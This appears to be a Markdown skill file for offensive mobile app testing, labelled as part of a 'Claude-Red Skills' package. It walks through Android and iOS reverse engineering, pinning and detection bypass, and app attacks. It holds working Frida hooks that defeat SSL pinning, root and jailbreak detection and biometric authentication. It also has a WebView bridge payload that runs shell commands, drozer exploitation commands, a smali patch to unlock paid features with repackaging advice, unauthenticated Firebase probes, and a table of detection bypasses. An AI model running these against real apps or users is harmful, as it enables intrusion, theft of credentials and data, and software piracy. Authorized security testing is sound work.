<!-- source: Claude-Red Skills/mobile/offensive-mobile -->
<!-- fused into host package: mobile-reverse -->

# Mobile (Android + iOS) — Offensive Testing Methodology

## Quick Workflow

1. Static: pull the IPA/APK, decompile, dump resources/strings, identify endpoints
2. Dynamic: install on rooted/jailbroken device, hook with Frida, intercept TLS
3. Map exported attack surface: deep links, URL schemes, exported components
4. Storage / Keystore audit: where do secrets live, what protects them
5. API: every backend the app talks to is your scope — test like a web app

---

## Lab Setup

### Android
- Rooted device or **Genymotion** / Android Studio AVD with `userdebug` build
- **Magisk** for systemless root; **LSPosed** for hooks; **Frida server** matching device arch
- **Burp / Mitmproxy** with system-trusted CA via Magisk module (`MagiskTrustUserCerts`)

### iOS
- Jailbroken device (palera1n / checkra1n / Dopamine depending on iOS version)
- **Frida** + **Objection** + **Filza** + **SSH via USB (iproxy 2222 22)**
- Burp CA installed via Settings → General → Device Management → Certificate Trust Settings

---

## Static Analysis

### Android

```bash
# Decode resources + smali
apktool d app.apk -o app

# Decompile to Java
jadx -d app_src app.apk

# Manifest review
xmllint --format app/AndroidManifest.xml | less
# Look for: android:exported="true", intent-filters, custom permissions, debuggable, allowBackup, networkSecurityConfig
```

```bash
# Secrets and endpoints
grep -rE '(https?://[a-z0-9.-]+|api[_-]?key|secret|token|firebase|amazonaws|appspot)' app_src/
grep -r "Log\.[dwief]" app_src/   # leftover debug logs

# Native libs
file app/lib/*/*.so
# RE in Ghidra/IDA; look for JNI_OnLoad and exported Java_* functions
```

### iOS

```bash
# Pull IPA from device
frida-ios-dump -o app.ipa "com.vendor.app"

# Or via App Store via 3rd-party tools (Apple Configurator with paid acct, etc.)
unzip app.ipa
# Decrypt if needed (jailbroken device): bagbak / clutch
bagbak com.vendor.app

# Class dump
class-dump-dyld -H Payload/App.app/App -o headers/
# Or for Swift symbols, use Hopper / IDA

# Strings / endpoints
strings -a Payload/App.app/App | grep -E '(https?://|key|secret|api)'
```

```bash
# Info.plist analysis
plutil -p Payload/App.app/Info.plist
# Look for: NSAppTransportSecurity exceptions, CFBundleURLTypes (URL schemes),
# associated-domains entitlements, UIFileSharingEnabled, ATS exemptions
```

---

## Dynamic Analysis & Frida

### Common Hooks

```javascript
// Bypass SSL pinning (Android — generic OkHttp/CertificatePinner/TrustManager)
Java.perform(() => {
  const X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  const TrustManagerFactory = Java.use('javax.net.ssl.TrustManagerFactory');
  // ... full bypass scripts: codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida
});

// Bypass root detection
Java.perform(() => {
  const File = Java.use('java.io.File');
  File.exists.implementation = function () {
    const path = this.getAbsolutePath();
    if (path.includes('su') || path.includes('Magisk')) return false;
    return this.exists();
  };
});

// iOS — bypass jailbreak detection
const stat = Module.findExportByName(null, 'stat');
Interceptor.attach(stat, {
  onEnter(args) {
    const path = args[0].readUtf8String();
    if (/Cydia|jailbreak|substrate|frida/i.test(path)) {
      args[0] = Memory.allocUtf8String('/nonexistent');
    }
  }
});
```

### Objection (Frida-based shortcuts)

```bash
objection -g com.vendor.app explore
# Then inside:
android sslpinning disable
android root disable
android hooking list activities
android intent launch_activity com.vendor.app/.SecretActivity
ios sslpinning disable
ios jailbreak disable
ios keychain dump
```

---

## SSL / TLS Interception

### Android Network Security Config

App with `<network-security-config>` requiring its own pinned CA: edit `res/xml/network_security_config.xml`, repack:

```bash
apktool b app -o app-patched.apk
apksigner sign --ks debug.keystore app-patched.apk
```

Or live-bypass with Frida (preferred — no recompile).

### iOS ATS / Pinning

For pinning, use Frida hooks against `SecTrustEvaluate*` / `NSURLSession` delegate methods. ATS exceptions in Info.plist (`NSAllowsArbitraryLoads`) make MITM trivial without pinning.

---

## Exported / IPC Attack Surface

### Android — Exported Components

```bash
drozer console connect
> run app.package.attacksurface com.vendor.app
> run app.activity.start --component com.vendor.app .ExportedActivity \
    --extra string url 'javascript:alert(1)'
> run app.provider.query content://com.vendor.app.provider/secrets
```

Targets:
- `exported="true"` activities → call from another app, bypass auth
- ContentProviders without `grantUriPermissions` → arbitrary read
- Receivers handling `BOOT_COMPLETED` etc. with privileged actions
- Services bound by intent extras → command injection

### Intent Redirection / PendingIntent Hijack

```java
// Vulnerable: PendingIntent with implicit Intent given to untrusted app
PendingIntent.getActivity(this, 0, new Intent(), FLAG_MUTABLE)
// Attacker fills the empty Intent → action runs with victim app's identity
```

### iOS — URL Schemes / Universal Links

```bash
# Open custom scheme (test from another app)
plutil -p Payload/App.app/Info.plist | grep -A 5 CFBundleURLTypes
# Then on device:
xcrun simctl openurl booted "vendorapp://payment?to=ATTACKER&amount=9999"
```

Universal Links: check `apple-app-site-association` on the linked domain — open redirect on that domain → universal-link claim → in-app webview navigation.

### iOS XPC / Mach Services

`launchctl list | grep com.vendor` enumerates the app's launch services. XPC handlers without proper audit-token validation accept messages from any process.

---

## Insecure Data Storage

### Android

```bash
# On device (root), pull app data
adb shell "su -c 'tar -cz /data/data/com.vendor.app'" > app_data.tgz
```

Inspect:
- `shared_prefs/*.xml` — preferences in plaintext
- `databases/*.db` — SQLite (use `sqlite3` to dump)
- `files/` — arbitrary writes
- `cache/` and external storage (`sdcard/Android/data/...`) — often readable across apps

### Android Keystore Misuse

- Keys created without `setUserAuthenticationRequired(true)` → use any time process is running
- AES-GCM with reused IV (devs often hardcode IV)
- RSA without proper padding (PKCS1 v1.5 vs OAEP)

### iOS Keychain

```bash
# Objection
ios keychain dump
# Look for kSecAttrAccessible values:
#   AlwaysThisDeviceOnly  → readable when phone locked (bad for secrets)
#   WhenUnlocked          → standard
#   AlwaysThisDeviceOnly  → bypasses screen lock
```

iOS Data Protection classes: NSFileProtectionNone files are readable on a jailbroken device even when locked.

---

## WebView Vulnerabilities

### Android `addJavascriptInterface`

If the app exposes a JS bridge with reflection-capable objects, JS in any loaded page = arbitrary Java method invocation.

```javascript
// In a page loaded by the WebView
JSBridge.getClass().forName('java.lang.Runtime')
  .getMethod('exec', String).invoke(JSBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null), 'id')
```

### file:// and Content://

WebView with `setAllowFileAccessFromFileURLs(true)` + a HTML attachment that the user opens → reads any file the app can.

### iOS WKWebView

- `WKWebViewConfiguration.preferences.javaScriptCanOpenWindowsAutomatically`
- `wkScriptMessageHandler` exposed — same JS bridge concern as Android
- File URL load with `loadFileURL` and broad `allowingReadAccessTo` directory

---

## Biometric / Auth Bypass

### Android BiometricPrompt

Apps using BiometricPrompt **without binding** the cryptographic operation to authentication can be bypassed by hooking the result callback.

```javascript
Java.perform(() => {
  const Cb = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
  Cb.onAuthenticationSucceeded.implementation = function (r) {
    return this.onAuthenticationSucceeded(r);  // accept whatever
  };
  Cb.onAuthenticationFailed.implementation = function () { /* ignore */ };
});
```

### iOS LAContext

`evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics)` — if the app trusts the boolean result without using a Keychain item bound to biometrics, you can flip it.

```javascript
const LAContext = ObjC.classes.LAContext;
Interceptor.attach(LAContext['- evaluatePolicy:localizedReason:reply:'].implementation, {
  onEnter(args) {
    const cb = new ObjC.Block(args[4]);
    const orig = cb.implementation;
    cb.implementation = function(success, err) { orig.call(this, true, NULL); };
  }
});
```

The fix on the dev side is to use a **biometric-bound key** in the Keychain — the bypass above doesn't yield key access.

---

## Firebase / Cloud Misconfig (highest hit-rate)

### Firebase Realtime DB (still common)

Pull URL from app:

```bash
strings app.apk | grep -E "https://[a-z0-9-]+\.firebaseio\.com"
# Test for unauth read
curl https://target-app.firebaseio.com/.json
# If returns data → unauth read
```

### Firestore

Rules misconfigured to `allow read, write: if true;` — visible in app's REST calls. Test with anon SDK or direct REST.

### S3 / GCS / Azure Blob

Unsigned URLs in API responses, or bucket names guessable from app package — test public-read, public-write, ACL.

### Embedded API Keys

Google Maps key restricted properly? Stripe publishable vs secret? Twilio? AWS access keys in plaintext (still happens) → cloud takeover.

```bash
truffleHog filesystem app_src/
gitleaks detect --source app_src/
```

---

## Mobile API Testing

The backend is the same as a web app — pivot to web/API methodology once you've extracted the endpoints. Things specific to mobile:

- **Device-bound headers** (`X-Device-ID`, `X-App-Version`, `X-Signature`) often calculable client-side. Pull the algorithm from the binary.
- **Request signing**: HMAC with key embedded in app → game over, sign anything.
- **Mobile-only endpoints** that skip rate limiting because they're "behind app authentication"
- **Older API versions** still alive: `/api/v1/...` retired in newer app, server still serving with weaker auth.
- **Push notification topics**: subscribing to `/topics/<predictable>` may receive messages meant for others (Firebase Messaging).

---

## App Tampering & Repackaging

```bash
# Patch a check (e.g. premium=true)
# Smali edit
sed -i 's/return-void/const\/4 v0, 0x1\n    return v0/' app/smali/com/vendor/Premium.smali
apktool b app -o patched.apk
apksigner sign --ks debug.keystore patched.apk
adb install -r patched.apk
```

For commercial bypasses, use **LSPosed module** so original APK isn't modified — bypasses signature checks that lock down repackaged variants.

---

## iOS Specifics

### Entitlements

```bash
codesign -d --entitlements - Payload/App.app/App
```

Look for: `keychain-access-groups` (cross-app keychain), `com.apple.security.application-groups` (shared containers), `com.apple.developer.associated-domains` (universal links), private entitlements (rare).

### URL Schemes from Other Apps

```objc
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"vendorapp://..."]];
```

Any app can invoke any registered URL scheme. Validate sender? Most don't.

### App Groups Shared Container

```
/private/var/mobile/Containers/Shared/AppGroup/<UUID>/
```

Multiple apps from same vendor share — secrets here cross app boundary.

---

## Detection / Defender View

| Detector | Bypass |
|----------|--------|
| Frida server detection (port 27042 open) | Run frida-server on alt port, use `frida -H` |
| Magisk detection via `/sbin/magisk` | Magisk Hide / DenyList |
| Emulator detection | Run on real device, or stub `Build.FINGERPRINT` etc. |
| iOS jailbreak detection (file existence) | Frida hook `stat` / `fopen` / `dlopen` |
| Anti-debug `ptrace(PT_DENY_ATTACH)` | Frida-stalker-based, or kernel patch |
| Certificate pinning | Frida universal pinning bypass |
| App attestation (Play Integrity / DeviceCheck) | Hard — usually requires server-side bypass or app attestation token relay |

---

## Engagement Checklist

```
[ ] Pull IPA/APK from device
[ ] Decompile / class-dump
[ ] Grep for endpoints, keys, tokens
[ ] Manifest / Info.plist review
[ ] Static-find exported components, deep links, URL schemes
[ ] Install on rooted/jailbroken; configure Frida
[ ] Bypass pinning, MITM all traffic
[ ] Test every API the app calls (web methodology)
[ ] Test exported components from another app / drozer / runtime
[ ] Inspect on-device storage (sharedprefs, sqlite, keychain)
[ ] Test biometric flows for unbound auth
[ ] Test deep links / URL schemes for auth bypass / open redirect / IDOR
[ ] Cloud config: Firebase rules, S3 buckets, signed URLs
[ ] Push topics / subscription model
[ ] Device-binding / signing scheme analysis
```

---

## Key References

- OWASP MASTG (Mobile Application Security Testing Guide)
- OWASP MASVS — verification standard
- Frida CodeShare — codeshare.frida.re for ready-to-use hooks
- mobile-security-framework / MobSF for automated triage
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/mobile.md
